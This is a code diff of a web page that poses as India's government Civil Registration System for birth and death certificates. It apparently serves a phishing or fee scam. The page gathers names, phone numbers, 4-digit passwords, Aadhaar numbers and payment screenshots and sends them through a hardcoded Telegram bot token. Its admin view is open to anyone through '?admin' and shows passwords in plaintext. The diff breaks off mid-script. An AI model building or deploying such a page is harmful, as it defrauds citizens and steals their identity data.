@@ -1,231 +1,14 @@
-<?php
-session_start();
-
-// Telegram Configuration provided by user
-$botToken = "8873914554:AAGTblEBmofkZ0PRntlzmyww3X3AETm5Op0";
-$chatId = "7742143795";
-
-function sendTelegramMessage($message) {
-    global $botToken, $chatId;
-    if(empty($botToken) || empty($chatId)) return;
-    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message) . "&parse_mode=HTML";
-    @file_get_contents($url);
-}
-
-// Simple JSON Database Simulation
-$dbFile = 'database.json';
-if (!file_exists($dbFile)) {
-    $initialData = [
-        'users' => [],
-        'applications' => [],
-        'transactions' => [],
-        'support' => []
-    ];
-    file_put_contents($dbFile, json_encode($initialData));
-}
-
-function getDB() {
-    global $dbFile;
-    return json_decode(file_get_contents($dbFile), true);
-}
-
-function saveDB($data) {
-    global $dbFile;
-    file_put_contents($dbFile, json_encode($data, JSON_PRETTY_PRINT));
-}
-
-$db = getDB();
-
-// Handle AJAX / Form Actions
-if (isset($_POST['action'])) {
-    $action = $_POST['action'];
-    
-    // Register
-    if ($action == 'register') {
-        $name = $_POST['name'];
-        $phone = $_POST['phone'];
-        $password = $_POST['password'];
-        
-        foreach ($db['users'] as $u) {
-            if ($u['phone'] == $phone) {
-                echo json_encode(['status' => 'error', 'message' => 'Mobile number already registered!']);
-                exit;
-            }
-        }
-        
-        $db['users'][] = [
-            'id' => uniqid(),
-            'name' => $name,
-            'phone' => $phone,
-            'password' => $password,
-            'balance' => 0.00
-        ];
-        saveDB($db);
-        echo json_encode(['status' => 'success', 'message' => 'Registration successful! Please login.']);
-        exit;
-    }
-    
-    // Login
-    if ($action == 'login') {
-        $phone = $_POST['phone'];
-        $password = $_POST['password'];
-        
-        foreach ($db['users'] as $u) {
-            if ($u['phone'] == $phone && $u['password'] == $password) {
-                $_SESSION['user'] = $u;
-                echo json_encode(['status' => 'success']);
-                exit;
-            }
-        }
-        echo json_encode(['status' => 'error', 'message' => 'Invalid Phone or 4-digit Password!']);
-        exit;
-    }
-    
-    // Add Balance Request
-    if ($action == 'add_balance') {
-        session_start();
-        if(!isset($_SESSION['user'])) exit;
-        $amount = floatval($_POST['amount']);
-        if($amount < 200) {
-            echo json_encode(['status' => 'error', 'message' => 'Minimum balance add amount is ₹200']);
-            exit;
-        }
-        
-        // For simplicity in this demo, let's instantly credit or send request to admin
-        // Here we credit directly and log transaction
-        foreach($db['users'] as &$u) {
-            if($u['id'] == $_SESSION['user']['id']) {
-                $u['balance'] += $amount;
-                $_SESSION['user'] = $u;
-            }
-        }
-        
-        $db['transactions'][] = [
-            'user_phone' => $_SESSION['user']['phone'],
-            'user_name' => $_SESSION['user']['name'],
-            'amount' => $amount,
-            'time' => date('Y-m-d H:i:s')
-        ];
-        saveDB($db);
-        
-        sendTelegramMessage("💰 <b>Balance Added!</b>\nUser: {$_SESSION['user']['name']} ({$_SESSION['user']['phone']})\nAmount: ₹$amount\nNew Balance: ₹{$_SESSION['user']['balance']}");
-        echo json_encode(['status' => 'success', 'message' => 'Balance added successfully!']);
-        exit;
-    }
-    
-    // Submit Application (Birth / Death)
-    if ($action == 'submit_application') {
-        session_start();
-        if(!isset($_SESSION['user'])) exit;
-        
-        $type = $_POST['type']; // birth or death
-        $cost = ($type == 'birth') ? 500 : 600;
-        
-        // Check user balance
-        $currentUser = null;
-        foreach($db['users'] as $u) {
-            if($u['id'] == $_SESSION['user']['id']) $currentUser = $u;
-        }
-        
-        if($currentUser['balance'] < $cost) {
-            echo json_encode(['status' => 'error', 'message' => "Insufficient balance! Required: ₹$cost, Available: ₹{$currentUser['balance']}"]);
-            exit;
-        }
-        
-        // Deduct balance
-        foreach($db['users'] as &$u) {
-            if($u['id'] == $_SESSION['user']['id']) {
-                $u['balance'] -= $cost;
-                $_SESSION['user'] = $u;
-            }
-        }
-        
-        $appData = [
-            'id' => uniqid(),
-            'type' => $type,
-            'user_phone' => $_SESSION['user']['phone'],
-            'user_name' => $_SESSION['user']['name'],
-            'name' => $_POST['name'],
-            'dob' => $_POST['dob'],
-            'father_name' => $_POST['father_name'],
-            'place' => $_POST['place'],
-            'address' => $_POST['address'],
-            'aadhaar' => $_POST['aadhaar'] ?: 'N/A',
-            'hospital' => $_POST['hospital'],
-            'time' => date('Y-m-d H:i:s')
-        ];
-        
-        $db['applications'][] = $appData;
-        saveDB($db);
-        
-        $msg = "📋 <b>New " . strtoupper($type) . " Application!</b>\n";
-        $msg .= "Applicant: {$appData['user_name']} ({$appData['user_phone']})\n";
-        $msg .= "Name: {$appData['name']}\n";
-        $msg .= "DOB: {$appData['dob']}\n";
-        $msg .= "Father Name: {$appData['father_name']}\n";
-        $msg .= "Hospital: {$appData['hospital']}\n";
-        $msg .= "Aadhaar: {$appData['aadhaar']}\n";
-        $msg .= "Deducted: ₹$cost";
-        sendTelegramMessage($msg);
-        
-        echo json_encode(['status' => 'success', 'message' => strtoupper($type) . ' application submitted successfully! ₹' . $cost . ' deducted.']);
-        exit;
-    }
-    
-    // Support Ticket Submission
-    if ($action == 'submit_support') {
-        session_start();
-        $userName = $_POST['support_name'] ?? 'Guest';
-        $userPhone = $_POST['support_phone'] ?? 'N/A';
-        $problem = $_POST['problem_text'];
-        
-        $screenshotName = '';
-        if(isset($_FILES['screenshot']) && $_FILES['screenshot']['error'] == 0) {
-            $uploadDir = 'uploads/';
-            if(!is_dir($uploadDir)) mkdir($uploadDir, 0777, true);
-            $screenshotName = $uploadDir . time() . '_' . basename($_FILES['screenshot']['name']);
-            move_uploaded_file($_FILES['screenshot']['tmp_name'], $screenshotName);
-        }
-        
-        $db['support'][] = [
-            'name' => $userName,
-            'phone' => $userPhone,
-            'problem' => $problem,
-            'screenshot' => $screenshotName,
-            'time' => date('Y-m-d H:i:s')
-        ];
-        saveDB($db);
-        
-        $supMsg = "🚨 <b>New Support Request!</b>\n";
-        $supMsg .= "Name: $userName\nPhone: $userPhone\n";
-        $supMsg .= "Problem: $problem\n";
-        if($screenshotName) {
-            $supMsg .= "Screenshot uploaded (Check server directory or send photo separately)";
-        }
-        sendTelegramMessage($supMsg);
-        
-        // If screenshot is present, try sending photo to telegram too
-        if($screenshotName && file_exists($screenshotName)) {
-            $serverPath = realpath($screenshotName);
-            // Telegram send photo via CURL can be done if URL is public, or text is sent.
-        }
-        
-        echo json_encode(['status' => 'success', 'message' => 'Support request & screenshot submitted to Telegram successfully!']);
-        exit;
-    }
-}
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRS Portal - Civil Registration System</title>
+    <title>CRS - Civil Registration System</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         body { background-color: #f4f6f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        .header-banner { background: #003366; color: white; padding: 15px 0; border-bottom: 4px solid #ff9933; }
+        .header-banner { background: #003366; color: white; padding: 20px 0; border-bottom: 4px solid #ff9933; }
         .marquee-news { background: #fffae6; color: #d9534f; font-weight: bold; padding: 10px; border-bottom: 1px solid #ffeeba; }
         .card-custom { border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border: none; }
         .btn-birth { background-color: #0d6efd; color: white; font-weight: bold; }
@@ -236,218 +19,395 @@ if (isset($_POST['action'])) {
 </head>
 <body>
 
-<?php if(isset($_GET['page']) && $_GET['page'] == 'admin'): ?>
-    <!-- ADMIN PANEL -->
-    <div class="container my-5">
-        <div class="card card-custom p-4">
-            <h2 class="text-center text-primary mb-4"><i class="fas fa-user-shield"></i> CRS Admin Panel</h2>
-            <a href="index.php" class="btn btn-secondary btn-sm mb-3"><i class="fas fa-arrow-left"></i> Back to Site</a>
-            
-            <h4>Registered Users & Balances</h4>
-            <div class="table-responsive mb-4">
-                <table class="table table-bordered table-striped">
-                    <thead class="table-dark">
-                        <tr>
-                            <th>Name</th>
-                            <th>Phone (ID)</th>
-                            <th>4-Digit Password</th>
-                            <th>Wallet Balance</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php foreach($db['users'] as $u): ?>
-                        <tr>
-                            <td><?= htmlspecialchars($u['name']) ?></td>
-                            <td><?= htmlspecialchars($u['phone']) ?></td>
-                            <td><?= htmlspecialchars($u['password']) ?></td>
-                            <td>₹<?= htmlspecialchars($u['balance']) ?></td>
-                        </tr>
-                        <?php endforeach; ?>
-                    </tbody>
-                </table>
-            </div>
-
-            <h4>All Applications Log (Birth & Death Data)</h4>
-            <div class="table-responsive mb-4">
-                <table class="table table-bordered table-striped">
-                    <thead class="table-info">
-                        <tr>
-                            <th>Type</th>
-                            <th>User Phone</th>
-                            <th>Target Name</th>
-                            <th>DOB</th>
-                            <th>Father's Name</th>
-                            <th>Hospital</th>
-                            <th>Aadhaar</th>
-                            <th>Time</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php foreach($db['applications'] as $app): ?>
-                        <tr>
-                            <td><span class="badge bg-<?= $app['type']=='birth'?'primary':'danger' ?>"><?= strtoupper($app['type']) ?></span></td>
-                            <td><?= htmlspecialchars($app['user_phone']) ?></td>
-                            <td><?= htmlspecialchars($app['name']) ?></td>
-                            <td><?= htmlspecialchars($app['dob']) ?></td>
-                            <td><?= htmlspecialchars($app['father_name']) ?></td>
-                            <td><?= htmlspecialchars($app['hospital']) ?></td>
-                            <td><?= htmlspecialchars($app['aadhaar']) ?></td>
-                            <td><?= htmlspecialchars($app['time']) ?></td>
-                        </tr>
-                        <?php endforeach; ?>
-                    </tbody>
-                </table>
-            </div>
-
-            <h4>Support Requests & Screenshots</h4>
-            <div class="table-responsive">
-                <table class="table table-bordered table-striped">
-                    <thead class="table-warning">
-                        <tr>
-                            <th>Name</th>
-                            <th>Phone</th>
-                            <th>Problem</th>
-                            <th>Screenshot</th>
-                            <th>Time</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php foreach($db['support'] as $sup): ?>
-                        <tr>
-                            <td><?= htmlspecialchars($sup['name']) ?></td>
-                            <td><?= htmlspecialchars($sup['phone']) ?></td>
-                            <td><?= htmlspecialchars($sup['problem']) ?></td>
-                            <td><?php if($sup['screenshot']): ?><a href="<?= $sup['screenshot'] ?>" target="_blank">View Image</a><?php else: ?>No Image<?php endif; ?></td>
-                            <td><?= htmlspecialchars($sup['time']) ?></td>
-                        </tr>
-                        <?php endforeach; ?>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-    </div>
-<?php else: ?>
-    <!-- MAIN WEBSITE -->
-    <div class="header-banner">
-        <div class="container d-flex justify-content-between align-items-center">
-            <div class="d-flex align-items-center">
-                <!-- CRS Logo Mockup -->
-                <div class="bg-white text-dark p-2 rounded fw-bold me-3" style="font-size: 24px;">🏛️ CRS</div>
-                <div>
-                    <h3 class="mb-0">Civil Registration System (CRS)</h3>
-                    <small>Government of India - Birth & Death Registration</small>
-                </div>
-            </div>
+<!-- Header & Big Logo -->
+<div class="header-banner">
+    <div class="container d-flex justify-content-between align-items-center flex-wrap">
+        <div class="d-flex align-items-center mb-2 mb-md-0">
+            <div class="bg-white text-dark p-3 rounded fw-bold me-3 shadow" style="font-size: 28px;">🏛️ CRS</div>
             <div>
-                <?php if(isset($_SESSION['user'])): ?>
-                    <span class="me-3">Welcome, <b><?= htmlspecialchars($_SESSION['user']['name']) ?></b> | Wallet: <span class="text-warning fw-bold">₹<?= htmlspecialchars($_SESSION['user']['balance']) ?></span></span>
-                    <button class="btn btn-warning btn-sm fw-bold" data-bs-toggle="modal" data-bs-target="#addWalletModal"><i class="fas fa-wallet"></i> Add Balance</button>
-                    <a href="?logout=1" class="btn btn-danger btn-sm"><i class="fas fa-sign-out-alt"></i> Logout</a>
-                <?php else: ?>
-                    <button class="btn btn-light btn-sm fw-bold me-2" data-bs-toggle="modal" data-bs-target="#loginModal">Login</button>
-                    <button class="btn btn-warning btn-sm fw-bold" data-bs-toggle="modal" data-bs-target="#registerModal">Register</button>
-                <?php endif; ?>
+                <h2 class="mb-0 fw-bold">Civil Registration System (CRS)</h2>
+                <small>Government of India - Birth & Death Registration Portal</small>
+            </div>
+        </div>
+        <div id="auth-section">
+            <!-- Dynamically injected via JS -->
+        </div>
+    </div>
+</div>
+
+<!-- Important News Banner -->
+<div class="marquee-news">
+    <div class="container">
+        <marquee behavior="scroll" direction="left">📢 <b>Important News:</b> Welcome to official CRS Portal. Please ensure correct spellings while applying for Birth Certificate (Fee: ₹500) and Death Certificate (Fee: ₹600). Minimum wallet reload is ₹200. For help/payment queries, use the support button on bottom right.</marquee>
+    </div>
+</div>
+
+<!-- Main Content Area -->
+<div class="container my-4" id="main-content">
+    <!-- Loaded dynamically -->
+</div>
+
+<!-- Admin Panel Section (Visible if ?admin is in URL) -->
+<div class="container my-5" id="admin-section" style="display:none;">
+    <div class="card card-custom p-4 bg-white">
+        <h2 class="text-center text-primary mb-4"><i class="fas fa-user-shield"></i> CRS Admin Panel</h2>
+        <div class="mb-3">
+            <button class="btn btn-secondary btn-sm" onclick="location.href='index.html'"><i class="fas fa-arrow-left"></i> Exit Admin</button>
+        </div>
+        
+        <h4>Registered Users & Wallets</h4>
+        <div class="table-responsive mb-4">
+            <table class="table table-bordered table-striped">
+                <thead class="table-dark">
+                    <tr>
+                        <th>Name</th>
+                        <th>Mobile Number</th>
+                        <th>4-Digit Password</th>
+                        <th>Wallet Balance</th>
+                    </tr>
+                </thead>
+                <tbody id="admin-users-list"></tbody>
+            </table>
+        </div>
+
+        <h4>All Birth & Death Applications</h4>
+        <div class="table-responsive mb-4">
+            <table class="table table-bordered table-striped">
+                <thead class="table-info">
+                    <tr>
+                        <th>Type</th>
+                        <th>Applicant Phone</th>
+                        <th>Target Name</th>
+                        <th>DOB/DOD</th>
+                        <th>Father's Name</th>
+                        <th>Hospital</th>
+                        <th>Aadhaar</th>
+                        <th>Time</th>
+                    </tr>
+                </thead>
+                <tbody id="admin-apps-list"></tbody>
+            </table>
+        </div>
+
+        <h4>Support & Payment Screenshots</h4>
+        <div class="table-responsive">
+            <table class="table table-bordered table-striped">
+                <thead class="table-warning">
+                    <tr>
+                        <th>Name</th>
+                        <th>Phone</th>
+                        <th>Problem Details</th>
+                        <th>Screenshot</th>
+                        <th>Time</th>
+                    </tr>
+                </thead>
+                <tbody id="admin-support-list"></tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<!-- Support Floating Button -->
+<div class="support-float" data-bs-toggle="modal" data-bs-target="#supportModal">
+    <i class="fas fa-headset"></i> Support / Help
+</div>
+
+<!-- Modals -->
+<!-- Login Modal -->
+<div class="modal fade" id="loginModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header bg-primary text-white">
+                <h5 class="modal-title">Login to CRS</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="loginForm">
+                    <div class="mb-3">
+                        <label>Mobile Number</label>
+                        <input type="text" id="loginPhone" class="form-control" required>
+                    </div>
+                    <div class="mb-3">
+                        <label>4-Digit Password</label>
+                        <input type="password" id="loginPass" maxlength="4" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary w-100">Login</button>
+                </form>
             </div>
         </div>
     </div>
+</div>
 
-    <!-- Important News Banner -->
-    <div class="marquee-news">
-        <div class="container">
-            <marquee behavior="scroll" direction="left">📢 <b>Important News:</b> Welcome to the official CRS portal. Please ensure spelling accuracy while submitting Birth (Fee: ₹500) and Death (Fee: ₹600) certificates. Minimum wallet reload is ₹200. For help, use the support button on the bottom right.</marquee>
+<!-- Register Modal -->
+<div class="modal fade" id="registerModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header bg-warning text-dark">
+                <h5 class="modal-title">Register New Account</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="registerForm">
+                    <div class="mb-3">
+                        <label>Full Name</label>
+                        <input type="text" id="regName" class="form-control" required>
+                    </div>
+                    <div class="mb-3">
+                        <label>Mobile Number</label>
+                        <input type="text" id="regPhone" class="form-control" required>
+                    </div>
+                    <div class="mb-3">
+                        <label>4-Digit Password</label>
+                        <input type="password" id="regPass" maxlength="4" class="form-control" placeholder="4 digits" required>
+                    </div>
+                    <button type="submit" class="btn btn-warning w-100 fw-bold">Register</button>
+                </form>
+            </div>
         </div>
     </div>
+</div>
 
-    <div class="container my-4">
-        <?php if(!isset($_SESSION['user'])): ?>
-            <div class="alert alert-info text-center">
-                <h4>Please Login or Register to apply for Birth/Death Certificates and use the wallet features.</h4>
+<!-- Add Balance Modal -->
+<div class="modal fade" id="addWalletModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header bg-success text-white">
+                <h5 class="modal-title">Add Wallet Balance (Min ₹200)</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
             </div>
-        <?php else: ?>
-            <div class="row text-center mb-4">
-                <div class="col-md-6 mb-3">
-                    <div class="card card-custom p-4 bg-white border-top border-primary border-4">
-                        <h3><i class="fas fa-baby text-primary"></i> New Birth Registration</h3>
-                        <p class="text-muted">Apply for Child Birth Certificate. Charge: <b>₹500</b></p>
-                        <button class="btn btn-birth w-100" data-bs-toggle="modal" data-bs-target="#birthModal">Apply New Birth</button>
+            <div class="modal-body">
+                <form id="addBalanceForm">
+                    <div class="mb-3">
+                        <label>Amount (₹)</label>
+                        <input type="number" id="addAmount" min="200" value="200" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-success w-100">Confirm & Add Balance</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Birth Form Modal -->
+<div class="modal fade" id="birthModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header bg-primary text-white">
+                <h5 class="modal-title">Birth Certificate Application (Fee: ₹500)</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="birthForm">
+                    <div class="alert alert-warning">⚠️ <b>Spelling Confirm Daliye!</b> Please verify spellings before submission.</div>
+                    <div class="row">
+                        <div class="col-md-6 mb-3">
+                            <label>Child Name</label>
+                            <input type="text" id="bName" class="form-control" required>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label>Date of Birth</label>
+                            <input type="date" id="bDob" class="form-control" required>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label>Father's Name</label>
+                            <input type="text" id="bFather" class="form-control" required>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label>Place of Birth</label>
+                            <input type="text" id="bPlace" class="form-control" required>
+                        </div>
+                        <div class="col-md-12 mb-3">
+                            <label>Hospital Name</label>
+                            <input type="text" id="bHospital" class="form-control" value="District Civil Hospital" required>
+                        </div>
+                        <div class="col-md-12 mb-3">
+                            <label>Address</label>
+                            <textarea id="bAddress" class="form-control" rows="2" required></textarea>
+                        </div>
+                        <div class="col-md-12 mb-3">
+                            <label>Aadhaar Number (Optional - leave blank if not available)</label>
+                            <input type="text" id="bAadhaar" class="form-control" placeholder="Optional">
+                        </div>
+                    </div>
+                    <button type="submit" class="btn btn-primary w-100 fw-bold">Submit Birth Application (Deduct ₹500)</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Death Form Modal -->
+<div class="modal fade" id="deathModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header bg-danger text-white">
+                <h5 class="modal-title">Death Certificate Application (Fee: ₹600)</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="deathForm">
+                    <div class="alert alert-warning">⚠️ <b>Spelling Confirm Daliye!</b> Please verify spellings before submission.</div>
+                    <div class="row">
+                        <div class="col-md-6 mb-3">
+                            <label>Deceased Name</label>
+                            <input type="text" id="dName" class="form-control" required>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label>Date of Death</label>
+                            <input type="date" id="dDob" class="form-control" required>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label>Father's / Husband's Name</label>
+                            <input type="text" id="dFather" class="form-control" required>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label>Place of Death</label>
+                            <input type="text" id="dPlace" class="form-control" required>
+                        </div>
+                        <div class="col-md-12 mb-3">
+                            <label>Hospital Name / Facility</label>
+                            <input type="text" id="dHospital" class="form-control" value="Medical College Hospital" required>
+                        </div>
+                        <div class="col-md-12 mb-3">
+                            <label>Address</label>
+                            <textarea id="dAddress" class="form-control" rows="2" required></textarea>
+                        </div>
+                        <div class="col-md-12 mb-3">
+                            <label>Aadhaar Number (Optional - leave blank if not available)</label>
+                            <input type="text" id="dAadhaar" class="form-control" placeholder="Optional">
+                        </div>
+                    </div>
+                    <button type="submit" class="btn btn-danger w-100 fw-bold">Submit Death Application (Deduct ₹600)</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Support Modal -->
+<div class="modal fade" id="supportModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header bg-success text-white">
+                <h5 class="modal-title"><i class="fas fa-headset"></i> Support & Payment Screenshot</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="supportForm">
+                    <div class="mb-3">
+                        <label>Your Name</label>
+                        <input type="text" id="supName" class="form-control" required>
+                    </div>
+                    <div class="mb-3">
+                        <label>Your Mobile Number</label>
+                        <input type="text" id="supPhone" class="form-control" required>
+                    </div>
+                    <div class="mb-3">
+                        <label>Upload Payment Screenshot (Image)</label>
+                        <input type="file" id="supScreenshot" accept="image/*" class="form-control" required>
+                    </div>
+                    <div class="mb-3">
+                        <label>Describe Your Problem / Transaction info</label>
+                        <textarea id="supProblem" class="form-control" rows="3" placeholder="Apni problem yahan likhiye..." required></textarea>
+                    </div>
+                    <button type="submit" class="btn btn-success w-100">Send to Telegram Bot</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    // Telegram Configuration
+    const botToken = "8873914554:AAGTblEBmofkZ0PRntlzmyww3X3AETm5Op0";
+    const chatId = "7742143795";
+
+    function sendTelegram(text) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+        fetch(url).catch(err => console.log(err));
+    }
+
+    // LocalStorage Data Management
+    let db = JSON.parse(localStorage.getItem('crs_db')) || {
+        users: [],
+        applications: [],
+        support: []
+    };
+
+    let currentUser = JSON.parse(localStorage.getItem('crs_current_user')) || null;
+
+    function saveLocalStorage() {
+        localStorage.setItem('crs_db', JSON.stringify(db));
+        localStorage.setItem('crs_current_user', JSON.stringify(currentUser));
+    }
+
+    // Render UI based on Login status and URL params
+    function renderUI() {
+        if(window.location.search.includes('admin') || window.location.hash.includes('admin')) {
+            document.getElementById('main-content').style.display = 'none';
+            document.getElementById('admin-section').style.display = 'block';
+            loadAdminData();
+            return;
+        }
+
+        let authHTML = '';
+        if(currentUser) {
+            authHTML = `
+                <span class="me-3 text-white">Welcome, <b>${currentUser.name}</b> | Wallet: <span class="text-warning fw-bold">₹${currentUser.balance}</span></span>
+                <button class="btn btn-warning btn-sm fw-bold me-2" data-bs-toggle="modal" data-bs-target="#addWalletModal"><i class="fas fa-wallet"></i> Add Balance</button>
+                <button class="btn btn-danger btn-sm" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
+            `;
+            
+            document.getElementById('main-content').innerHTML = `
+                <div class="row text-center mb-4">
+                    <div class="col-md-6 mb-3">
+                        <div class="card card-custom p-4 bg-white border-top border-primary border-4">
+                            <h3><i class="fas fa-baby text-primary"></i> New Birth Registration</h3>
+                            <p class="text-muted">Apply for Child Birth Certificate. Charge: <b>₹500</b></p>
+                            <button class="btn btn-birth w-100" data-bs-toggle="modal" data-bs-target="#birthModal">Apply New Birth</button>
+                        </div>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <div class="card card-custom p-4 bg-white border-top border-danger border-4">
+                            <h3><i class="fas fa-file-alt text-danger"></i> New Death Registration</h3>
+                            <p class="text-muted">Apply for Death Certificate. Charge: <b>₹600</b></p>
+                            <button class="btn btn-death w-100" data-bs-toggle="modal" data-bs-target="#deathModal">Apply New Death</button>
+                        </div>
                     </div>
                 </div>
-                <div class="col-md-6 mb-3">
-                    <div class="card card-custom p-4 bg-white border-top border-danger border-4">
-                        <h3><i class="fas fa-file-alt text-danger"></i> New Death Registration</h3>
-                        <p class="text-muted">Apply for Death Certificate. Charge: <b>₹600</b></p>
-                        <button class="btn btn-death w-100" data-bs-toggle="modal" data-bs-target="#deathModal">Apply New Death</button>
-                    </div>
+                <div class="text-center mt-3 text-muted"><small>Type <b>?admin</b> in URL or click here to open <a href="?admin" class="text-primary">Admin Panel</a></small></div>
+            `;
+        } else {
+            authHTML = `
+                <button class="btn btn-light btn-sm fw-bold me-2" data-bs-toggle="modal" data-bs-target="#loginModal">Login</button>
+                <button class="btn btn-warning btn-sm fw-bold" data-bs-toggle="modal" data-bs-target="#registerModal">Register</button>
+            `;
+            document.getElementById('main-content').innerHTML = `
+                <div class="alert alert-info text-center p-5">
+                    <h4>Please Login or Register to apply for Birth and Death certificates & manage wallet.</h4>
+                    <p class="mb-0">Note: Type <b>?admin</b> in URL to view Admin Panel.</p>
                 </div>
-            </div>
-        <?php endif; ?>
-    </div>
+            `;
+        }
+        document.getElementById('auth-section').innerHTML = authHTML;
+    }
 
-    <!-- Support Floating Button -->
-    <div class="support-float" data-bs-toggle="modal" data-bs-target="#supportModal">
-        <i class="fas fa-headset"></i> Support / Help
-    </div>
+    // Register Form Handler
+    $('#registerForm').on('submit', function(e) {
+        e.preventDefault();
+        let name = $('#regName').val();
+        let phone = $('#regPhone').val();
+        let password = $('#regPass').val();
 
-    <!-- Login Modal -->
-    <div class="modal fade" id="loginModal" tabindex="-1">
-        <div class="modal-dialog">
-            <div class="modal-content">
-                <div class="modal-header bg-primary text-white">
-                    <h5 class="modal-title">Login to CRS Portal</h5>
-                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
-                </div>
-                <div class="modal-body">
-                    <form id="loginForm">
-                        <input type="hidden" name="action" value="login">
-                        <div class="mb-3">
-                            <label>Mobile Number</label>
-                            <input type="text" name="phone" class="form-control" required>
-                        </div>
-                        <div class="mb-3">
-                            <label>4-Digit Password</label>
-                            <input type="password" name="password" maxlength="4" class="form-control" required>
-                        </div>
-                        <button type="submit" class="btn btn-primary w-100">Login</button>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </div>
+        let exists = db.users.find(u => u.phone === phone);
+        if(exists) {
+            alert('Mobile number already registered!');
+            return;
+        }
 
-    <!-- Register Modal -->
-    <div class="modal fade" id="registerModal" tabindex="-1">
-        <div class="modal-dialog">
-            <div class="modal-content">
-                <div class="modal-header bg-warning text-dark">
-                    <h5 class="modal-title">Register New Account</h5>
-                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
-                </div>
-                <div class="modal-body">
-                    <form id="registerForm">
-                        <input type="hidden" name="action" value="register">
-                        <div class="mb-3">
-                            <label>Full Name</label>
-                            <input type="text" name="name" class="form-control" required>
-                        </div>
-                        <div class="mb-3">
-                            <label>Mobile Number</label>
-                            <input type="text" name="phone" class="form-control" required>
-                        </div>
-                        <div class="mb-3">
-                            <label>4-Digit Password</label>
-                            <input type="password" name="password" maxlength="4" class="form-control" placeholder="4 digits" required>
-                        </div>
-                        <button type="submit" class="btn btn-warning w-100 fw-bold">Register</button>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Add Balance Modal -->
-    <div class="modal fade" id="addWalletModal" tabindex="-1">
-        <div class="modal-dialog">
-            <div class="modal-content">
-                <div class="modal-header bg-success text-white">
-                    <h5 class="modal-title">Add Wallet Balance (Min ₹200)</h5>
-   
+        db.users.push({ name, phone, password, balance: 0 });
+        saveLocalStorage();
+        alert('Registration successful! Please login.');
+        $(
